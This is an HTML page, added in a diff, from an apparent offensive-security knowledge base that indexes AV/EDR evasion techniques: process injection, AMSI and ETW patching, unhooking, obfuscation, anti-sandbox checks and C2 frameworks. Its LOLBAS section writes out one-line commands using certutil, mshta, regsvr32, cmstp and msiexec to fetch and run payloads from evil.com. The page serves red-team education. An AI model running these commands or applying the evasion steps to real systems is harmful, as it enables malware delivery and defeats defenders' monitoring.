@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evasion Techniques | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .techniques-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+    .technique-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 1rem; padding: 1.5rem; transition: var(--transition); }
+    .technique-card:hover { border-color: var(--primary); transform: translateY(-2px); }
+    .technique-card h3 { color: var(--primary); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+    .technique-card .attck-id { font-size: 0.75rem; color: var(--text-muted); }
+    .technique-card p { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem; }
+    .technique-card .difficulty { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 20px; font-size: 0.7rem; font-weight: 600; margin-bottom: 1rem; }
+    .diff-expert { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .diff-advanced { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .technique-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--primary); font-weight: 600; }
+    .technique-link:hover { text-decoration: underline; }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .category-section { margin: 3rem 0; }
+    .category-section h2 { margin-bottom: 1.5rem; }
+    @media (max-width: 768px) { .techniques-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / Evasion
+    </div>
+
+    <div class="page-header">
+      <h1>🎭 AV/EDR Evasion Techniques</h1>
+      <p style="color: var(--text-secondary); font-size: 1.1rem; max-width: 800px;">
+        Comprehensive guide to bypassing antivirus, EDR solutions, and endpoint protection. Learn process injection, code obfuscation, and defense evasion techniques used by red teams and advanced threat actors.
+      </p>
+    </div>
+
+    <div class="info-box">
+      <strong>What is Evasion?</strong><br>
+      Evasion techniques allow malware and penetration testing tools to bypass security controls, avoid detection by EDR solutions, and execute malicious code without triggering alerts. These techniques are critical for red team operations and advanced threat simulations.
+    </div>
+
+    <!-- PROCESS INJECTION -->
+    <div class="category-section" id="process-injection">
+      <h2>💉 Process Injection</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-sync"></i> DLL Injection</h3>
+          <span class="attck-id">ATT&CK T1055.001</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Inject malicious DLL into running process via CreateRemoteThread and LoadLibrary. Classic technique used by malware.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-layer-group"></i> Process Hollowing</h3>
+          <span class="attck-id">ATT&CK T1055.008</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Unmap legitimate process and replace with malicious code. Create target process in suspended state, then hollow it out.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-exchange-alt"></i> Process Doppelgänging</h3>
+          <span class="attck-id">ATT&CK T1055.009</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Use NTFS transactions to replace executable at rest while running process from cached version. Bypasses file-based AV.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-bolt"></i> APC Injection</h3>
+          <span class="attck-id">ATT&CK T1055.004</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Queue Asynchronous Procedure Calls to threads in alertable state. Fire-and-forget execution before threads return to user code.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-memory"></i> Early Bird Injection</h3>
+          <span class="attck-id">ATT&CK T1055.001</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Inject shellcode before target process reaches its entry point. Injects during ntdll initialization phase.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-database"></i> Thread Local Storage Injection</h3>
+          <span class="attck-id">ATT&CK T1055.005</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Manipulate TLS callbacks to redirect execution to malicious code when process or thread starts.</p>
+          <a href="process-injection.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- EDR BYPASS -->
+    <div class="category-section" id="edr-bypass">
+      <h2>🛡️ EDR Bypass Techniques</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-unlink"></i> DLL Unhooking</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Restore hooked API functions by copying clean .text sections from disk. Removes EDR inline hooks from ntdll, kernel32, etc.</p>
+          <a href="process-injection.html#payloads-edr-bypass" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-ban"></i> ETW Blocking</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Patch EtwEventWrite and EtwTiLogOnstackEvent to block ETW telemetry. Prevents kernel event tracing.</p>
+          <a href="process-injection.html#payloads-edr-bypass" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-shield-alt"></i> AMSI Bypass</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Patch AmsiScanBuffer and AmsiScanString to always return AMSI_RESULT_CLEAN. Enables PowerShell script execution.</p>
+          <a href="process-injection.html#payloads-edr-bypass" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-eye-slash"></i> Direct Syscalls</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Bypass user-land hooks by making direct system calls to ntdll. Use syscall numbers to call kernel directly.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-memory"></i> Heaven's Gate</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Execute 64-bit code from 32-bit process via far jump to 64-bit code segment. Bypasses 32-bit monitoring.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-clock"></i> Timing Attacks</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Use Sleep() and Calculate elapsed time to detect instrumentation. Sleep longer if being debugged.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- CODE OBFUSCATION -->
+    <div class="category-section" id="obfuscation">
+      <h2>🔐 Code Obfuscation</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-box-open"></i> Payload Packers</h3>
+          <span class="attck-id">T1027.002</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Compress and encrypt executables. Decrypt at runtime in memory. UPX, custom packers with anti-debugging.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-file-code"></i> Shellcode Encryption</h3>
+          <span class="attck-id">T1027.001</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Encrypt shellcode with AES-256. Decrypt key stored separately or derived at runtime. Obfuscate strings.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-random"></i> Polymorphic Code</h3>
+          <span class="attck-id">T1027.001</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Self-modifying code that changes appearance on each execution. Use junk code insertion and register randomization.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-th"></i> XOR Obfuscation</h3>
+          <span class="attck-id">T1027.001</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>Simple XOR encoding with single or multi-byte keys. Decode at runtime before execution.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- DEFENSE EVASION -->
+    <div class="category-section" id="defense-evasion">
+      <h2>🎭 Defense Evasion</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-user-shield"></i> Parent PID Spoofing</h3>
+          <span class="attck-id">T1134.004</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Spawn processes with spoofed parent PID (explorer.exe). Makes attribution harder and avoids monitoring.</p>
+          <a href="process-injection.html#defense-evasion" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-terminal"></i> Masquerading</h3>
+          <span class="attck-id">T1036</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>Rename malicious executables to match system binaries. Use Windows\System32 paths to appear legitimate.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-clock"></i> Timestomping</h3>
+          <span class="attck-id">T1070.006</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>Modify file timestamps (create/modify/access) to match legitimate files or blend with existing files.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-file-alt"></i> File Deletion</h3>
+          <span class="attck-id">T1070.004</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>Delete files after use using native tools (cmd.exe del) or direct syscalls to avoid recycle bin.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-network"></i> Network Evasion</h3>
+          <span class="attck-id">T1090</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Use domain fronting, encrypted C2 channels, and fast-flux DNS to avoid network-based detection.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-service"></i> Service Root</h3>
+          <span class="attck-id">T1569.002</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Run malicious code as a Windows service via sc.exe or direct service API calls with SYSTEM privileges.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- ANTI-ANALYSIS -->
+    <div class="category-section" id="anti-analysis">
+      <h2>🔍 Anti-Analysis Techniques</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-bug"></i> Anti-Debugging</h3>
+          <span class="attck-id">T1143</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Detect debugger presence using IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-vm"></i> Anti-VM Detection</h3>
+          <span class="attck-id">T1497.001</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Detect virtualized environments via CPUID, MAC addresses, registry keys, WMIC output, and hardware artifacts.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-file-search"></i> Anti-Sandbox</h3>
+          <span class="attck-id">T1497</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Detect sandbox by checking user count, running processes, sample folder paths, and idle time.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-memory"></i> Memory Scrubbing</h3>
+          <span class="attck-id">Custom</span>
+          <span class="difficulty diff-expert">Expert</span>
+          <p>Clear forensic evidence from memory after execution. Zero out allocated memory regions before freeing.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- LOLBAS TECHNIQUES -->
+    <div class="category-section" id="lolbas">
+      <h2>🧪 LOLBAS (Living Off the Land)</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-download"></i> CertUtil Download</h3>
+          <span class="attck-id">T1105</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-terminal"></i> MSHTA Execution</h3>
+          <span class="attck-id">T1218.003</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>mshta.exe http://evil.com/payload.hta - Execute HTA content from URL or local file.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-code"></i> MSBuild</h3>
+          <span class="attck-id">T1127</span>
+          <span class="difficulty diff-advanced">Advanced</span>
+          <p>Execute inline C# code via MSBuild.exe. No compiler needed, executes in clean process.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-database"></i> Regsvr32</h3>
+          <span class="attck-id">T1218.010</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>regsvr32.exe /s /n /u /i:http://evil.com/file.sct - Execute via SCT scriptlet.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-cog"></i> CMSTP</h3>
+          <span class="attck-id">T1218.003</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>cmstp.exe /s /ns http://evil.com/payload.inf - Bypass UAC and execute via CMSTP.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-file-pdf"></i> Msiexec</h3>
+          <span class="attck-id">T1218.007</span>
+          <span class="difficulty diff-beginner">Intermediate</span>
+          <p>msiexec.exe /q /i http://evil.com/payload.msi - Execute via MSI package.</p>
+          <a href="anti-debugging.html" class="technique-link"><i class="fas fa-arrow-right"></i> Full Guide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOLS -->
+    <div class="category-section" id="tools">
+      <h2>🛠️ Essential Tools</h2>
+      
+      <div class="techniques-grid">
+        <div class="technique-card">
+          <h3><i class="fas fa-shield-alt"></i> Cobalt Strike</h3>
+          <p>Commercial red team C2 framework with built-in evasion capabilities, process injection, and lateral movement.</p>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-dragon"></i> Covenant</h3>
+          <p>Open-source .NET-based C2 framework with strong cross-platform support and built-in evasion features.</p>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-cat"></i> Sliver</h3>
+          <p>Open-source C2 framework by Bishop Fox with implant generation, process injection, and EDR bypass.</p>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-bug"></i> PE-Sieve</h3>
+          <p>Memory forensics tool to detect process hollowing, Doppelgänging, and other injection techniques.</p>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-code"></i> Frida</h3>
+          <p>Dynamic instrumentation toolkit for hooking, tracing, and manipulating running processes at runtime.</p>
+        </div>
+
+        <div class="technique-card">
+          <h3><i class="fas fa-box"></i> UnhookPE</h3>
+          <p>Tool to unhook EDR DLL hooks by restoring original functions from disk-loaded copies.</p>
+        </div>
+      </div>
+    </div>
+
+    <a href="../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Home</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+</script>
+
+</body>
+</html>
